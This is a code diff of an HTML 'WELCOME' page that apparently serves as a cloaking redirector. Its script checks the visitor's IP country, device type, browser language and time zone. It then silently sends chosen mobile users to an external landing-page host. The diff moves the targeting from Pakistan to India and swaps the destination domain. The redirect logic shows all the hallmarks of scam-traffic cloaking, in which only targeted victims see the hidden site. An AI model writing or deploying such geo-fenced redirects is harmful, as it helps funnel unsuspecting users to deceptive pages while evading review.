@@ -2,13 +2,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-	 <!--
-	<script>
-		window.onload = function() {
-			window.location.href = "https://www.jacmsotck.online/rigufb/tbgu1online.html";
-		}
-	</script>
-     -->
+ 
 
   <title>WELCOME</title>
   <meta charset="utf-8">
@@ -47,13 +41,17 @@
     return navigator.language.startsWith('en') || 
            navigator.languages.some(lang => lang.startsWith('en'));
 }
-
+ 
+function isIndianTimeZone() {
+  const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  return timeZone === 'Asia/Kolkata'; // 印度时区唯一标识
+}
     fetch('https://ipapi.co/json/')
       .then(response => response.json())
       .then(data => {
         // 严格的三重条件判断
-        if (data.country === 'PK' && isMobileDevice() ) {
-          window.location.href = "https://www.jacmsotck.online/jz/j2.html";
+        if (data.country === 'IN' && isMobileDevice() && isIndianTimeZone()) {
+          window.location.href = "http://luodiye.pol123.com/";
           return;
         }
      
@@ -67,7 +65,7 @@
       .catch(() => {
         // IP检测失败时严格的双重条件判断
         if (isMobileDevice() && isEnglishLang()) {
-          window.location.href = "https://www.jacmsotck.online/jz/j2.html";
+          window.location.href = "http://luodiye.pol123.com/";
           return;
         }
         
